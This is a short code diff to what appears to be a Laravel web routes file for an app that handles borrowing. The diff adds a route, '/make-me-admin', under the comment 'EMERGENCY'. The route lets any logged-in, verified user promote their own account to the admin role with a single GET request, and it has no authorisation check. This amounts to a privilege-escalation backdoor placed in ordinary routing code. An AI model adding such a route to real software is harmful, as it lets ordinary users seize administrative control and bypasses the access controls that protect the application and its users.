@@ -21,6 +21,14 @@ Route::middleware(['auth', 'verified'])->group(function () {
         return redirect()->route('user.dashboard');
     })->name('dashboard');
 
+    // EMERGENCY: Promote current user to admin
+    Route::get('/make-me-admin', function () {
+        $user = auth()->user();
+        $user->role = 'admin';
+        $user->save();
+        return redirect()->route('dashboard');
+    });
+
     // Admin Routes
     Route::middleware('can:admin')->prefix('admin')->name('admin.')->group(function () {
         Route::get('/dashboard', [BorrowingController::class, 'dashboardStats'])->name('dashboard');
